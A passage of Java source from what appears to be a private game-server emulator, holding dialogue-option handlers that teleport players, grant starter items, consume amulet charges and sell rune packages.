				c.sendMessage("@red@You now have 0 charges left in your glory.");
			}
			c.potDelay = System.currentTimeMillis();
		}
		if (c.usingSkills)  //c.getPA().useCharge();
		{
			c.getPA().startTeleport(1769, 3711, 0, "glory", false);
			c.getPA().useChargeSkills();
		}
		if (c.dialogueAction == 2) {
			c.getPA().startTeleport(2884, 3395, 0, "modern", false);
		}
		if (c.dialogueAction == 3) {
			c.getPA().startTeleport(3243, 3513, 0, "modern", false);
		}
		if (c.dialogueAction == 4) {
			c.getPA().startTeleport(2444, 5170, 0, "modern", false);
		}
		if (c.dialogueAction == 20) {
			c.getPA().startTeleport(2897, 3618, 12, "modern", false);
		} else if (c.teleAction == 200) {
			// assault
			c.getPA().spellTeleport(2605, 3153, 0, false);
		}
		if (c.caOption4c) {
			c.getDH().sendDialogues(120, c.npcType);
			c.caOption4c = false;
		}
		if (c.caPlayerTalk1) {
			c.getDH().sendDialogues(125, c.npcType);
			c.caPlayerTalk1 = false;
		}
	}

	/*
	 * Handles all the 3rd options on 'Four option' dialogues.
	 */
	public static void handleOption3(Player c) {
		switch (c.dialogueAction) {
		
		case 181://hard
			if (c.getSlayer().getTask().isPresent()) {
				c.getDH().sendDialogues(190, 6797);
			} else if (c.combatLevel < 80) {
				c.getDH().sendDialogues(192, 6797);
			} else {
			c.getDH().sendDialogues(184, -1);
			}
		break;

		}
		if (c.dialogueAction == 136) {
			c.getDH().sendDialogues(666, 1603);
			return;
		}
		switch (c.teleAction) {
		case 1:
			c.getPA().spellTeleport(3289, 3639, 0, false);
			break;
		case 2:
			c.getPA().spellTeleport(1262, 3501, 0, false);
			break;
		}
		if (c.dialogueAction == 122) {
			c.getDH().sendDialogues(624, 954);
			return;
		}
		if (c.dialogueAction == 3301) {
			if (c.npcType == 8623) {
				c.getSlayer().getTask().ifPresentOrElse(
						task -> c.sendMessage("[SLAYER] Your task is to kill " + task.getPrimaryName() + ", at " + c.getKonarSlayerLocation() + "."),
						() -> c.sendMessage("You don't have a Slayer task."));
				c.getPA().closeAllWindows();
			} else {
				c.getDH().sendDialogues(3310, c.npcType);
			}
		}
		if (c.teleAction == 13) {
			c.getPA().spellTeleport(2920, 5325, 2, false);
		}
		
		if (c.teleAction == 200) {
			c.getPA().spellTeleport(2439, 5169, 0, false);
			c.sendMessage("Use the cave entrance to start.");
		}
		if (c.teleAction == 3) {
			c.getPA().spellTeleport(1440, 3648, 0, false);
		}
		if (c.dialogueAction == 2299) {
			c.playerXP[0] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[0] = c.getPA().getLevelForXP(c.playerXP[0]);
			c.getPA().refreshSkill(0);
			c.playerXP[1] = c.getPA().getXPForLevel(1) + 5;
			c.playerLevel[1] = c.getPA().getLevelForXP(c.playerXP[1]);
			c.getPA().refreshSkill(1);
			c.playerXP[2] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[2] = c.getPA().getLevelForXP(c.playerXP[2]);
			c.getPA().refreshSkill(2);
			c.playerXP[3] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[3] = c.getPA().getLevelForXP(c.playerXP[3]);
			c.getPA().refreshSkill(3);
			c.playerXP[4] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[4] = c.getPA().getLevelForXP(c.playerXP[4]);
			c.getPA().refreshSkill(4);
			c.playerXP[5] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[5] = c.getPA().getLevelForXP(c.playerXP[5]);
			c.getPA().refreshSkill(5);
			c.playerXP[6] = c.getPA().getXPForLevel(99) + 5;
			c.playerLevel[6] = c.getPA().getLevelForXP(c.playerXP[6]);
			c.getPA().refreshSkill(6);
			c.getItems().addItem(3105, 1);
			c.getItems().addItem(1712, 1);
			c.getItems().addItem(4151, 1);
			c.getItems().addItem(5698, 1);
			c.getItems().addItem(6107, 1);
			c.getItems().addItem(6108, 1);
			c.getItems().addItem(4502, 1);
			c.getItems().addItem(6568, 1);
			//c.getItems().addItem(3842, 1);
			c.getItems().addItem(2497, 1);
			c.getItems().addItem(7458, 1);
			c.getItems().addItem(2550, 1);
			c.sendMessage("<img=10>An appropriate starter package has been given to you.");
			c.getPA().sendFrame126("Combat Level: " + c.combatLevel + "", 3983);
			c.getPA().removeAllWindows();
			c.dialogueAction = 0;
		}
		if (c.dialogueAction == 14400) {
		c.getPA().startTeleport(3004, 3935, 0, "modern", false);
		c.sendMessage("You will gain XP after each lap");
		}
		if (c.dialogueAction == 1658) {
			if (!c.getItems().playerHasItem(995, 1788000)) {
				c.sendMessage("You must have 1,788,000 coins to buy this package.");
				c.getPA().removeAllWindows();
				c.dialogueAction = 0;
				return;
			}
			c.dialogueAction = 0;
			c.getItems().addItemToBankOrDrop(556, 1000);
			c.getItems().addItemToBankOrDrop(554, 1000);
			c.getItems().addItemToBankOrDrop(558, 1000);
			c.getItems().addItemToBankOrDrop(557, 1000);
			c.getItems().addItemToBankOrDrop(555, 1000);
			c.getItems().addItemToBankOrDrop(560, 1000);
			c.getItems().addItemToBankOrDrop(565, 1000);
			c.getItems().addItemToBankOrDrop(566, 1000);
			c.getItems().addItemToBankOrDrop(9075, 1000);
			c.getItems().addItemToBankOrDrop(562, 1000);
			c.getItems().addItemToBankOrDrop(561, 1000);
			c.getItems().addItemToBankOrDrop(563, 1000);
			c.getItems().deleteItem(995, c.getItems().getInventoryItemSlot(995), 1788000);
			c.sendMessage("@red@The runes has been added to your bank.");
			c.getPA().removeAllWindows();
		}
		if (c.usingGlory) // c.getPA().useCharge();
		{
			if (System.currentTimeMillis() - c.potDelay < 4000) {
				c.sendMessage("@blu@Please wait a few seconds before doing another action.");
				c.getPA().closeAllWindows();
				return;
				}
			if (c.getItems().playerHasItem(19707, 1)) {
				c.getPA().startTeleport(Configuration.DRAYNOR_X, Configuration.DRAYNOR_Y, 0, "glory", false);
			} else if (c.getItems().playerHasItem(1712, 1)) {
					c.getItems().deleteItem(1712, 1);
					c.getItems().addItem(1710, 1);
					c.getPA().startTeleport(Configuration.DRAYNOR_X, Configuration.DRAYNOR_Y, 0, "glory", false);
				c.sendMessage("@red@You now have 3 charges left in your glory.");
		
				} else if (c.getItems().playerHasItem(1710, 1)) {							
					c.getItems().deleteItem(1710, 1);
					c.getItems().addItem(1708, 1);
					c.getPA().startTeleport(Configuration.DRAYNOR_X, Configuration.DRAYNOR_Y, 0, "glory", false);
				c.sendMessage("@red@You now have 2 charges left in your glory.");
			
			} else if (c.getItems().playerHasItem(1708, 1)) {							
				c.getItems().deleteItem(1708, 1);
				c.getItems().addItem(1706, 1);
				c.getPA().startTeleport(Configuration.DRAYNOR_X, Configuration.DRAYNOR_Y, 0, "glory", false);
			c.sendMessage("@red@You now have 1 charges left in your glory.");
			
			} else  if (c.getItems().playerHasItem(1706, 1)) {							
				c.getItems().deleteItem(1706, 1);
				c.getItems().addItem(1704, 1);
				c.getPA().startTeleport(Configuration.DRAYNOR_X, Configuration.DRAYNOR_Y, 0, "glory", false);
				c.sendMessage("@red@You now have 0 charges left in your glory.");
			}
			c.potDelay = System.currentTimeMillis();
		}
		if (c.usingSkills)  //c.getPA().useCharge();
		{
			c.getPA().startTeleport(1502, 3832, 0, "glory", false);
			c.getPA().useChargeSkills();
		}
		if (c.dialogueAction == 2) {
			c.getPA().startTeleport(2471, 10137, 0, "modern", false);
		}
		if (c.dialogueAction == 3) {
			c.getPA().startTeleport(3363, 3676, 0, "modern", false);
		}
		if (c.dialogueAction == 4) {
			c.getPA().startTeleport(2659, 2676, 0, "modern", false);
		}
		if (c.dialogueAction == 20) {
			c.getPA().startTeleport(2897, 3618, 8, "modern", false);
		} else if (c.teleAction == 200) {
			// duel arena
			c.getPA().spellTeleport(3366, 3266, 0, false);
		}
		if (c.caOption4c) {
			c.getDH().sendDialogues(122, c.npcType);
			c.caOption4c = false;
		}
		if (c.caPlayerTalk1) {
			c.getDH().sendDialogues(127, c.npcType);
			c.caPlayerTalk1 = false;
		}
	}

	/*
	 * Handles all the 4th options on 'Four option' dialogues.
	 */
	public static void handleOption4(Player c) {
		switch (c.dialogueAction) {
		case 181://boss
			int slayerLevel = c.playerLevel[Skill.SLAYER.getId()];
			if (c.getSlayer().getTask().isPresent()) {
				c.getDH().sendDialogues(190, 6797);
			} else if (c.combatLevel < 100 && slayerLevel < 99) {
				c.getDH().sendDialogues(193, 6797);
			} else {
			c.getDH().sendDialogues(185, -1);
			}
		break;
		case 1401:
			c.getPA().removeAllWindows();
			break;
		}
		switch (c.teleAction) {
		case 1:
			c.getPA().spellTeleport(3153, 3923, 0, false);
			break;
		case 2:
			c.getPA().spellTeleport(2630, 5071, 0, false);
			return;
		}
		if (c.dialogueAction == 3301) {
			c.getSlayer().cancelTaskWithGp();
		}
		if (c.dialogueAction == 122) {
			c.getPA().closeAllWindows();
		}
		if (c.teleAction == 201 || c.dialogueAction == 129 || c.dialogueAction == 136) {
			// pest
			c.getPA().removeAllWindows();
		}
		if (c.teleAction == 13) {
			c.getPA().spellTeleport(2907, 5265, 0, false);
			// c.sendMessage("You must know it's not easy, get a team to own
			// that boss!");
		}
		if (c.teleAction == 3) {
			c.getPA().spellTeleport(2200, 3055, 0, false);
		}
		if (c.teleAction == 200) {
			c.getDH().sendDialogues(2002, -1);
			return;
		}
		if (c.dialogueAction == 2299) {
			c.sendMessage("<img=10>You can set your stats by clicking them in the stats tab.");
			c.getPA().removeAllWindows();
			c.dialogueAction = 0;
		}
		if (c.dialogueAction == 1658) {
			c.getShops().openShop(5);
			c.dialogueAction = 0;
		}
		if (c.dialogueAction == 14400) {
		c.getDH().sendDialogues(14410, -1);
		}
		if (c.usingGlory) // c.getPA().useCharge();
		{
			if (System.currentTimeMillis() - c.potDelay < 4000) {
				c.sendMessage("@blu@Please wait a few seconds before doing another action.");
				c.getPA().closeAllWindows();
				return;
				}
			if (c.getItems().playerHasItem(19707, 1)) {
				c.getPA().startTeleport(Configuration.AL_KHARID_X, Configuration.AL_KHARID_Y, 0, "glory", false);
			} else if (c.getItems().playerHasItem(1712, 1)) {
					c.getItems().deleteItem(1712, 1);
					c.getItems().addItem(1710, 1);
					c.getPA().startTeleport(Configuration.AL_KHARID_X, Configuration.AL_KHARID_Y, 0, "glory", false);
				c.sendMessage("@red@You now have 3 charges left in your glory.");
		
				} else if (c.getItems().playerHasItem(1710, 1)) {							
					c.getItems().deleteItem(1710, 1);
					c.getItems().addItem(1708, 1);
					c.getPA().startTeleport(Configuration.AL_KHARID_X, Configuration.AL_KHARID_Y, 0, "glory", false);
				c.sendMessage("@red@You now have 2 charges left in your glory.");
			
			} else if (c.getItems().playerHasItem(1708, 1)) {							
				c.getItems().deleteItem(1708, 1);
				c.getItems().addItem(1706, 1);
				c.getPA().startTeleport(Configuration.AL_KHARID_X, Configuration.AL_KHARID_Y, 0, "glory", false);
			c.sendMessage("@red@You now have 1 charges left in your glory.");
			
			} else if (c.getItems().playerHasItem(1706, 1)) {							
				c.getItems().deleteItem(1706, 1);
				c.getItems().addItem(1704, 1);
				c.getPA().startTeleport(Configuration.AL_KHARID_X, Configuration.AL_KHARID_Y, 0, "glory", false);
			c.sendMessage("@red@You now have 0 charges left in your glory.");
			}
			c.potDelay = System.currentTimeMillis();
		}
		if (c.usingSkills)  //c.getPA().useCharge();
		{
			c.getPA().startTeleport(1721, 3464, 0, "glory", false);
			c.getPA().useChargeSkills();
		}
		if (c.dialogueAction == 2) {
			c.getPA().startTeleport(2669, 3714, 0, "modern", false);
		}
		if (c.dialogueAction == 3) {
			c.getPA().startTeleport(2540, 4716, 0, "modern", false);
		}
		if (c.dialogueAction == 4) {
			c.getPA().startTeleport(3366, 3266, 0, "modern", false);

		} else if (c.teleAction == 200) {
			// tzhaar
			c.getPA().spellTeleport(2444, 5170, 0, false);
		}
		if (c.dialogueAction == 20) {
			// c.getPA().startTeleport(3366, 3266, 0, "modern");
			// c.killCount = 0;
			c.sendMessage("This will be added shortly");
		}
		if (c.caOption4c) {
			c.getDH().sendDialogues(124, c.npcType);
			c.caOption4c = false;
		}
		if (c.caPlayerTalk1) {
			c.getDH().sendDialogues(130, c.npcType);
			c.caPlayerTalk1 = false;
		}
	}

}
